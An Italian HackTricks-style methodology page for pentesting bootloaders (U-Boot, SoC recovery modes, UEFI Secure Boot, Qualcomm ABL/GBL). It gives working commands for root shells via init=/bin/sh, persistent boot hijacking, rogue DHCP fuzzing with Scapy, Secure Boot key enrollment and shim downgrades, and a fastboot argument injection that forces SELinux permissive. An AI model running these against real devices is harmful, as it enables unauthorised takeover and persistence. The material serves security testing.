# Testing del Bootloader

{{#include ../../banners/hacktricks-training.md}}

I seguenti passaggi sono consigliati per modificare le configurazioni di avvio dei dispositivi e testare bootloader come U-Boot e loader di classe UEFI. Concentrati sull'ottenimento dell'esecuzione di codice nelle prime fasi, sulla valutazione delle protezioni contro le firme e il rollback e sull'abuso dei percorsi di recovery o network-boot.

Correlato: bypass del secure boot MediaTek tramite patching di bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Quick win di U-Boot e abuso dell'environment

1. Accedere alla shell dell'interprete
- Durante l'avvio, premi un tasto di interruzione noto (spesso un tasto qualsiasi, 0, spazio o una sequenza "magica" specifica della board) prima dell'esecuzione di `bootcmd` per accedere al prompt di U-Boot.

2. Ispezionare lo stato di avvio e le variabili
- Comandi utili:
- `printenv` (dump dell'environment)
- `bdinfo` (informazioni sulla board, indirizzi di memoria)
- `help bootm; help booti; help bootz` (metodi di boot del kernel supportati)
- `help ext4load; help fatload; help tftpboot` (loader disponibili)

3. Modificare gli argomenti di avvio per ottenere una root shell
- Aggiungi `init=/bin/sh` in modo che il kernel avvii una shell invece del normale init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Effettuare il netboot dal tuo server TFTP
- Configura la rete e recupera un kernel/immagine FIT dalla LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Rendere persistenti le modifiche tramite l'environment
- Se lo storage dell'environment non è protetto dalla scrittura, puoi rendere persistente il controllo:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Controlla la presenza di variabili come `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` che influenzano i percorsi di fallback. Valori configurati erroneamente possono consentire interruzioni ripetute verso la shell.

6. Controllare le funzionalità di debug/non sicure
- Cerca: `bootdelay` > 0, `autoboot` disabilitato, `usb start; fatload usb 0:1 ...` senza restrizioni, possibilità di usare `loady`/`loads` tramite seriale, `env import` da supporti non attendibili e kernel/ramdisk caricati senza controlli della firma.

7. Testing dell'immagine/verifica di U-Boot
- Se la piattaforma dichiara di utilizzare secure/verified boot con immagini FIT, prova sia immagini unsigned sia immagini manomesse:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- L'assenza di `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o il comportamento legacy `verify=n` spesso consente di avviare payload arbitrari.
- Non fermarti a un semplice risultato allow/deny: ricerche recenti su FIT hanno dimostrato che il percorso di verifica stesso può essere una superficie di attacco pre-auth. Esegui negative test sui dati FIT memorizzati esternamente (`data-offset`, `data-position`, `data-size`), sulla selezione delle configurazioni firmate, su `loadables` e sulla gestione di overlay / `extra-conf`.
- Se disponi di un source tree corrispondente, `test/vboot/vboot_test.sh` è un modo rapido per riprodurre il comportamento della verifica FIT nella sandbox di U-Boot prima di intervenire sull'hardware reale.

8. Standard Boot (`bootstd`), `extlinux` e bootflow tramite script
- Nelle build moderne di U-Boot, `bootcmd` è spesso solo un wrapper attorno a Standard Boot. Ciò significa che supporti scrivibili, PXE o flash SPI possono diventare il vero confine di trust anche quando l'environment visibile sembra innocuo.
- `extlinux` bootmeth cerca `extlinux/extlinux.conf` sotto `/` e `/boot`; lo script bootmeth cerca prima `boot.scr.uimg` e poi `boot.scr`. Nel network boot, il nome dello script può provenire da `boot_script_dhcp`.
- Comandi utili per il triage:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Casi di abuso da testare: supporti USB/SD controllati dall'attaccante e posizionati prima in `boot_targets`, `/boot/extlinux/extlinux.conf` scrivibile, TFTP rogue che fornisce `boot.scr` o esecuzione di script basata su SPI tramite `script_offset_f`.
- Se la piattaforma si basa sulla verifica FIT, assicurati che le configurazioni siano firmate a livello di configurazione e non solo per immagine; `required-mode=all` è più robusto rispetto all'accettazione di una singola chiave richiesta.

## Superficie di network boot (DHCP/PXE) e server rogue

9. Fuzzing dei parametri PXE/DHCP
- La gestione BOOTP/DHCP legacy di U-Boot ha presentato problemi di memory safety. Ad esempio, CVE‑2024‑42040 descrive una memory disclosure tramite risposte DHCP appositamente create, che può fare leak di byte dalla memoria di U-Boot sulla rete. Esegui i code path DHCP/PXE con valori eccessivamente lunghi o di margine (opzione 67 bootfile-name, vendor option, campi file/servername) e osserva eventuali hang/leak.
- Snippet Scapy minimo per stressare i parametri di boot durante il netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Verifica inoltre se i campi del nome file PXE vengono passati alla logica della shell/loader senza sanitizzazione quando sono concatenati a script di provisioning lato OS.

10. Testing dell'injection di comandi tramite server DHCP rogue
- Configura un servizio DHCP/PXE rogue e prova a inserire caratteri nei campi filename o nelle option per raggiungere gli interpreti di comandi nelle fasi successive della boot chain. L'auxiliary DHCP di Metasploit, `dnsmasq` o script Scapy personalizzati funzionano bene. Assicurati prima di isolare la rete di laboratorio.

## Modalità di recovery della SoC ROM che sovrascrivono il boot normale

Molte SoC espongono una modalità "loader" BootROM che accetta codice tramite USB/UART anche quando le immagini flash non sono valide. Se i fuse del secure boot non sono stati bruciati, ciò può fornire l'esecuzione arbitraria di codice molto presto nella chain.

- NXP i.MX (Serial Download Mode)
- Tool: `uuu` (mfgtools3) o `imx-usb-loader`.
- Esempio: `imx-usb-loader u-boot.imx` per inviare ed eseguire un U-Boot personalizzato dalla RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Esempio: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` oppure `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Esempio: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` per preparare un loader e caricare un U-Boot personalizzato.

Valuta se il dispositivo dispone di eFuse/OTP secure-boot bruciati. In caso contrario, le modalità di download BootROM spesso bypassano qualsiasi verifica di livello superiore (U-Boot, kernel, rootfs) eseguendo il payload di first-stage direttamente dalla SRAM/DRAM.

## Bootloader UEFI/di classe PC: controlli rapidi

11. Testing di tampering dell'ESP, rollback ed enrollment delle chiavi
- Monta la EFI System Partition (ESP) e controlla i componenti del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, percorsi dei loghi del vendor.
- Esegui il dump dello stato di Secure Boot e dei database delle chiavi dal sistema operativo quando possibile:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Se la piattaforma è in Setup Mode, accetta l'enrollment non autenticato delle chiavi o viene distribuita con una Platform Key (PKfail class) di test/default, un admin locale o un attaccante con accesso fisico può registrare la propria KEK/db e mantenere Secure Boot apparentemente "abilitato" avviando comunque binari EFI arbitrari.
- Prova ad avviare componenti di boot firmati sottoposti a downgrade o notoriamente vulnerabili se le revoche Secure Boot (dbx) non sono aggiornate. Se la piattaforma si fida ancora di shim/bootmanager obsoleti, spesso puoi caricare il tuo kernel o `grub.cfg` dall'ESP per ottenere persistenza.

12. Testing delle revoche stale di shim / SBAT / dbx
- Shim firmati da Microsoft e fork dei vendor obsoleti possono ancora costituire un percorso di bootkit in stile BYOVD se le revoche sono stale. In un laboratorio isolato, posiziona uno shim storicamente vulnerabile sull'ESP e prova a eseguire il chainload del tuo `grubx64.efi` o kernel.
- Triage rapido:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Se lo shim viene ancora eseguito nonostante sia presente nella lista delle revoche, il firmware/OS dispone di aggiornamenti `dbx` stale oppure si fida di un loader forked che non ha mai ereditato le protezioni SBAT upstream.

13. Bug nel parsing del boot logo (classe LogoFAIL)
- Diversi firmware OEM/IBV erano vulnerabili a flaw nel parsing delle immagini in DXE che elaborano i boot logo. Se un attaccante può posizionare un'immagine appositamente creata sull'ESP in un percorso specifico del vendor (ad esempio `\EFI\<vendor>\logo\*.bmp`) e riavviare, potrebbe essere possibile ottenere l'esecuzione di codice durante le prime fasi del boot anche con Secure Boot abilitato. Verifica se la piattaforma accetta loghi forniti dall'utente e se tali percorsi sono scrivibili dall'OS.


## Gap di trust di Android/Qualcomm ABL + GBL (Android 16)

Sui dispositivi Android 16 che utilizzano l'ABL di Qualcomm per caricare la **Generic Bootloader Library (GBL)**, verifica se l'ABL **autentica** l'app UEFI caricata dalla partizione `efisp`. Se l'ABL controlla solo la **presenza** di un'app UEFI e non ne verifica le firme, una write primitive verso `efisp` diventa **esecuzione di codice unsigned pre-OS** durante il boot.

Controlli pratici e percorsi di abuso:

- **write primitive su `efisp`**: è necessario un modo per scrivere un'app UEFI personalizzata in `efisp` (root/servizio privilegiato, bug in un'app OEM, percorso recovery/fastboot). Senza questo, il gap di caricamento del GBL non è direttamente raggiungibile.
- **injection di argomenti OEM fastboot** (bug dell'ABL): alcune build accettano token aggiuntivi in `fastboot oem set-gpu-preemption` e li aggiungono alla kernel cmdline. Questo può essere utilizzato per forzare SELinux permissive, consentendo la scrittura di partizioni protette:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Se il dispositivo è patched, il comando dovrebbe rifiutare gli argomenti aggiuntivi.
- **Bootloader unlock tramite flag persistenti**: un payload nella fase di boot può modificare flag persistenti di sblocco (ad esempio `is_unlocked=1`, `is_unlocked_critical=1`) per emulare `fastboot oem unlock` senza i gate del server/approvazione OEM. Si tratta di un cambiamento di postura duraturo dopo il riavvio successivo.

Note difensive/di triage:

- Conferma se l'ABL esegue la verifica della firma sul payload GBL/UEFI proveniente da `efisp`. In caso contrario, considera `efisp` una superficie di persistenza ad alto rischio.
- Verifica se gli handler fastboot OEM dell'ABL sono patched per **validare il numero di argomenti** e rifiutare i token aggiuntivi.

## Attenzione all'hardware

Presta attenzione quando interagisci con flash SPI/NAND durante le prime fasi del boot (ad esempio mettendo a massa i pin per bypassare le letture) e consulta sempre il datasheet della flash. Cortocircuiti effettuati nel momento sbagliato possono corrompere il dispositivo o il programmer.

## Note e suggerimenti aggiuntivi

- Prova `env export -t ${loadaddr}` e `env import -t ${loadaddr}` per spostare gli environment blob tra RAM e storage; alcune piattaforme consentono di importare l'environment da supporti rimovibili senza autenticazione.
- Per ottenere persistenza sui sistemi basati su Linux che eseguono il boot tramite `extlinux.conf`, spesso è sufficiente modificare la riga `APPEND` (per inserire `init=/bin/sh` o `rd.break`) sulla partizione di boot quando non sono applicati controlli della firma.
- Se il target utilizza aggiornamenti dual-slot / A/B, esamina le tecniche anti-rollback e di slot-desync nella [panoramica dell'analisi del firmware](README.md) per non trascurare i gap di trust presenti solo nell'updater e non nel bootloader stesso.
- Se lo userland fornisce `fw_printenv/fw_setenv`, verifica che `/etc/fw_env.config` corrisponda allo storage reale dell'environment. Offset configurati erroneamente consentono di leggere/scrivere la regione MTD sbagliata.

## Riferimenti

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
